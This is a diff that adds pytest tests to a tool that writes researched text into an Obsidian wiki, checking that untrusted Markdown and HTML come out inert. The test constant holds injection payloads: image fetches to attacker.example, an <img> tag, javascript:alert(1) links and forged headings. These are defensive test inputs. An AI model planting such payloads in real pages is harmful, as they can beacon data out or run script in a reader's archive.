@@ -2,6 +2,7 @@
 from __future__ import annotations
 
 import json
+import re
 from datetime import datetime, timedelta, timezone
 
 import pytest
@@ -247,3 +248,61 @@ class TestCli:
     def test_an_unparseable_now_flag_is_refused_by_name(self, mac, tmp_path):
         with pytest.raises(SystemExit, match="--now 'garbage' is not ISO8601"):
             rec.main([str(edition(tmp_path)), "--now", "garbage"])
+
+
+HOSTILE = "![](https://attacker.example/p.png?o=owner) <img src=https://attacker.example/i.png> ![[secret]] [click](javascript:alert(1)) %%hidden%% ==loud=="
+
+
+class TestResearchTextIsInertInTheWiki:
+    """Research text is untrusted and Obsidian renders Markdown and HTML: nothing
+    a researched page says may become an image fetch, a link, a heading or a
+    list item in the owner's archive."""
+
+    def hostile_edition(self, tmp_path):
+        card = {"recommendations": [
+            {**RECOMMENDATION, "headline": HOSTILE, "body": "Line one.\n# Forged heading\n- forged item\n1. forged step\n> forged quote\n| forged | table |",
+             "first_step": HOSTILE, "evidence": [{"claim": HOSTILE, "source": "![](https://attacker.example/s.png)", "url": "https://example.com/acme"}],
+             "advisor": {**RECOMMENDATION["advisor"], "quote": HOSTILE, "url": "javascript:alert(1)"}},
+            *CARD["recommendations"][1:],
+        ], "questions": [HOSTILE]}
+        path = edition(tmp_path, headline=HOSTILE, notes=[
+            {"claim": HOSTILE, "url": "javascript:alert(1)", "quote": "…"},
+            {"claim": "BRL up 1% on Sep 18", "url": "https://news.example/fx (x)<y>", "quote": "…"},
+        ])
+        data = json.loads(path.read_text())
+        for section in data["sections"]:
+            if section.get("desk") == "priority":
+                section["priority"] = card
+            if section.get("desk") == "news":
+                section.update(title=HOSTILE, headline=HOSTILE, body=f"{HOSTILE}\n## Forged section\n* forged bullet")
+        path.write_text(json.dumps(data))
+        notes = tmp_path / "run" / "t_9f2a" / "notes.json"
+        notes.write_text(json.dumps({**json.loads(notes.read_text()), "could_not_source": [HOSTILE]}))
+        return path
+
+    def test_no_active_markdown_or_html_survives(self, mac, tmp_path):
+        rec.record(Wiki(mac.call_tool), self.hostile_edition(tmp_path), "cht_1", MORNING)
+        _, body = split_page(day(mac))
+        # What a Markdown renderer still reads as syntax once backslash escapes are literal.
+        live = re.sub(r"\\.", "", body)
+        for active in ("![](", "<img", "![[", "](javascript:", "%%hidden%%", "==loud=="):
+            assert active not in live, active
+        lines = body.splitlines()
+        for forged in ("# Forged heading", "## Forged section", "- forged item", "* forged bullet",
+                       "1. forged step", "> forged quote", "| forged | table |"):
+            assert forged not in lines, forged
+
+    def test_only_http_links_are_written_and_they_stay_readable(self, mac, tmp_path):
+        rec.record(Wiki(mac.call_tool), self.hostile_edition(tmp_path), "cht_1", MORNING)
+        meta, body = split_page(day(mac))
+        assert "(unlinked source)" in body
+        assert "https://news.example/fx%20(x)%3Cy%3E" in body or "https://news.example/fx%20%28x%29%3Cy%3E" in body
+        resources = [s["resource"] for s in meta["sources"]]
+        assert all(r.startswith(("https://", "http://", "plow-chat:")) for r in resources), resources
+
+    def test_ordinary_prose_reads_the_same(self, mac, tmp_path):
+        rec.record(Wiki(mac.call_tool), edition(tmp_path), "cht_1", MORNING)
+        body = day(mac)
+        assert "The real rose 1%." in body
+        assert "BRL up 1% on Sep 18 (https://news.example/fx)" in body
+        assert "Q1 — Which customer would publicly vouch for you?" in body
